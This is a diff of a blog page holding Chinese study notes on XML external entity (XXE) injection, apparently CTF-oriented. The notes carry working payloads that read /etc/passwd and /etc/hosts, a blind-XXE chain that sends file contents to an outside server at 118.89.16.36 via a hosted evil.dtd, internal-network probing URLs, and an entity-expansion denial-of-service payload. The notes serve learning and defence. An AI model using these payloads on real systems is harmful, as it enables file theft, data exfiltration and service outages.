@@ -98,7 +98,7 @@
 <meta property="og:site_name" content="Yiruma">
 <meta property="og:description" content="XXE攻击的场景以及用途 XXE产生的原因 （基础学习）XML文档类型定义部分————dtd的说明 基于回显的XXE攻击 无回显的Blind XXE攻击 基于XXE的其他攻击 参考文章">
 <meta property="og:image" content="http://i.imgur.com/CGNfRmF.png">
-<meta property="og:updated_time" content="2017-08-26T06:35:16.785Z">
+<meta property="og:updated_time" content="2017-10-01T16:42:26.469Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE学习笔记">
 <meta name="twitter:description" content="XXE攻击的场景以及用途 XXE产生的原因 （基础学习）XML文档类型定义部分————dtd的说明 基于回显的XXE攻击 无回显的Blind XXE攻击 基于XXE的其他攻击 参考文章">
@@ -305,6 +305,11 @@
           
 
           
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
 
           
 
@@ -331,7 +336,7 @@
 </ul>
 <h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h2 id="XXE攻击的场景以及用途"><a href="#XXE攻击的场景以及用途" class="headerlink" title="XXE攻击的场景以及用途"></a>XXE攻击的场景以及用途</h2><p>在一切对XML文件进行解析的场景中，都有可能出现XXE注入。像XML文件作为配置文件（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为<user><name>Yiruma</name></user>处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点<br>说到XXE攻击的常见用途有：实现文件包含，重复定义引用（仿递归）的DDOS攻击，外部文件引用，内网探测，待补充。。。。</p>
 <h2 id="XXE产生的原因"><a href="#XXE产生的原因" class="headerlink" title="XXE产生的原因"></a>XXE产生的原因</h2><p>在有对XML文件进行解析的地方，如果使用了不安全的XML解析函数如php的simplexml_load_string()，对外部实体进行了解析下，就有可能引入不安全的参数，从而造成攻击。</p>
-<h2 id="（基础学习）XML文档类型定义部分————dtd的说明"><a href="#（基础学习）XML文档类型定义部分————dtd的说明" class="headerlink" title="（基础学习）XML文档类型定义部分————dtd的说明"></a>（基础学习）XML文档类型定义部分————dtd的说明</h2><p>首先给出一坨dtd以表明其结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE ANY[  </div><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  </div><div class="line">&lt;!ENTITY % evil SYSTEM &quot;http://127.0.0.1/evil.dtd&quot;&gt;  </div><div class="line">&lt;!ENTITY xie &quot;xie&quot;&gt;</div><div class="line">%remote;  </div><div class="line">%send;  </div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="（基础学习）XML文档类型定义部分————dtd的说明"><a href="#（基础学习）XML文档类型定义部分————dtd的说明" class="headerlink" title="（基础学习）XML文档类型定义部分————dtd的说明"></a>（基础学习）XML文档类型定义部分————dtd的说明</h2><p>首先给出一坨dtd以表明其结构<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE ANY[  </span></div><div class="line">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;  </div><div class="line">&lt;!ENTITY % evil SYSTEM "http://127.0.0.1/evil.dtd"&gt;  </div><div class="line">&lt;!ENTITY xie "xie"&gt;</div><div class="line">%remote;  </div><div class="line">%send;  </div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
 <p><strong>在dtd里面可以通过&lt;!ENTITY [SYSTEM] xxxx&gt;定义两种参数———参数实体与一般实体。</strong></p>
 <p><strong>参数实体</strong>格式为&lt;!ENTITY % name [SYSTEM] “”&gt;但是参数实体只能在dtd中使用，并且不能在实体定义中使用，引用后也不会产生回显，种种限制下我们看到参数实体最常见的作用其实就是在dtd中定义后再引用，起到使用SYSTEM下通过协议引入资源的作用，类似于php中的require  如：<code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>  <code>&lt;!ENTITY % all SYSTEM &quot;http://118.89.16.36/evil.dtd&quot;&gt;</code> 然后再 %all; %file;</p>
 <p><strong>一般实体</strong>格式为&lt;!ENTITY name [SYSTEM] “”&gt;一般实体可以在实体定义中使用如<code>&lt;!ENTITY xie SYSTEM &quot;xie,&amp;fei;&quot;&gt;</code> 可以在XML文档中使用如<xxe>&amp;file</xxe>,一般在dtd文档外部引用来回显数据</p>
@@ -339,10 +344,10 @@
 <p><strong>如果使用SYSTEM的话，就可以使用各种协议或是伪协议，在存在漏洞的xml解析函数中就会解析外部实体，据Ben师傅笔记来说，php5.5.12和5.6以上都不会自动解析，php5.4.4可以</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">file:///path/to/file.ext   本地文件</div><div class="line">http://118.89.16.36/xss/?file=xx  文件包含</div><div class="line">http://10.5.68.243  内网探测</div><div class="line">php://filter/read=convert.base64-encode/resource=conf.php  文件包含</div></pre></td></tr></table></figure></p>
 <h2 id="基于回显的XXE攻击"><a href="#基于回显的XXE攻击" class="headerlink" title="基于回显的XXE攻击"></a>基于回显的XXE攻击</h2><p>如果存在回显的话，就可以在dtd文档外部引用一般实体来得到数据 如在dtd中定义<code>&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>  在外部引用<code>&lt;x&gt;&amp;file;&lt;/x&gt;</code></p>
 <h2 id="无回显的Blind-XXE攻击"><a href="#无回显的Blind-XXE攻击" class="headerlink" title="无回显的Blind XXE攻击"></a>无回显的Blind XXE攻击</h2><p><strong>注：已经更新了payload，并在题目中尝试成功。xxe没有接收到的原因并不是payload有问题，而是要获取的文件不存在！！！</strong></p>
-<p>如果不存在回显的话，就可以使用dtd文档内<code>&lt;!ENTITY file SYSTEM &quot;http://118.89.16.36/xss/?data=xxx&quot;&gt;</code>协议的特性，来携带关键数据访问vps后拿到，构造blind xxe是需要好好考虑下的<br>由于参数实体无法在定义中使用，形如<code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>  <code>&lt;!ENTITY file SYSTEM &quot;http://118.89.16.36/xss/?data=%file&quot;&gt;</code>就无法使用了，因此我们考虑这样一种构建方式：<br>首先在vps中建立evil.dtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all</div><div class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://118.89.16.36/x/?%file;&apos;&gt;&quot;</div><div class="line">&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure></p>
-<p>然后xml中书写如下形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE ANY [ </div><div class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/hosts&quot;&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://118.89.16.36/x/myjs/evil.dtd&quot;&gt;</div><div class="line">%dtd;</div><div class="line">%send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
+<p>如果不存在回显的话，就可以使用dtd文档内<code>&lt;!ENTITY file SYSTEM &quot;http://118.89.16.36/xss/?data=xxx&quot;&gt;</code>协议的特性，来携带关键数据访问vps后拿到，构造blind xxe是需要好好考虑下的<br>由于参数实体无法在定义中使用，形如<code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>  <code>&lt;!ENTITY file SYSTEM &quot;http://118.89.16.36/xss/?data=%file&quot;&gt;</code>就无法使用了，因此我们考虑这样一种构建方式：<br>首先在vps中建立evil.dtd<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all</div><div class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://118.89.16.36/x/?%file;'&gt;"</div><div class="line">&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure></p>
+<p>然后xml中书写如下形式<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://118.89.16.36/x/myjs/evil.dtd"&gt;</div><div class="line">%dtd;</div><div class="line">%send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
 <p>执行的逻辑结构大概就是这样：<br><img src="http://i.imgur.com/CGNfRmF.png" alt=""><br>作图时忘了加上了，服务器中放置的DTD文件是%all包含的一个文本，文本中的%使用了HTML编码，因为做为特殊字符，如果不进行编码的话，在定义%all中就会出现问题</p>
-<h2 id="基于XXE的其他攻击"><a href="#基于XXE的其他攻击" class="headerlink" title="基于XXE的其他攻击"></a>基于XXE的其他攻击</h2><p><strong>拒绝服务攻击(DDoS)</strong><br>测试后可以看到形如<code>&lt;!ENTITY xxe &quot;&amp;xie;&quot;&gt;</code>递归定义无法实现,但可以手动实现下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE data [</div><div class="line">&lt;!ENTITY a0 &quot;dos&quot; &gt;</div><div class="line">&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;</div><div class="line">&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;</div><div class="line">&lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;</div><div class="line">&lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;</div><div class="line">]&gt;</div><div class="line">&lt;data&gt;&amp;a4;&lt;/data&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="基于XXE的其他攻击"><a href="#基于XXE的其他攻击" class="headerlink" title="基于XXE的其他攻击"></a>基于XXE的其他攻击</h2><p><strong>拒绝服务攻击(DDoS)</strong><br>测试后可以看到形如<code>&lt;!ENTITY xxe &quot;&amp;xie;&quot;&gt;</code>递归定义无法实现,但可以手动实现下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY a0 "dos" &gt;</div><div class="line">&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;</div><div class="line">&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;</div><div class="line">&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;</div><div class="line">&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;a4;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>这个文件只有 30 Kb大小但却有 11111 个实体引用，超出了合法的实体引用数量上限。</p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">腾讯安全应急响应中心：未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">Exploit的小站~：XXE漏洞以及Blind XXE总结</a><br><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="external">FreeBuf：DTD/XXE 攻击笔记分享</a><br><a href="http://www.jinglingshu.org/?p=7830" target="_blank" rel="external">精灵鼠：XXE注入攻击与防御</a></p>
 
@@ -534,6 +539,12 @@
     <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Yiruma</span>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
 </div>
 
 
@@ -550,6 +561,26 @@
 
 
         
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
 
         
       </div>
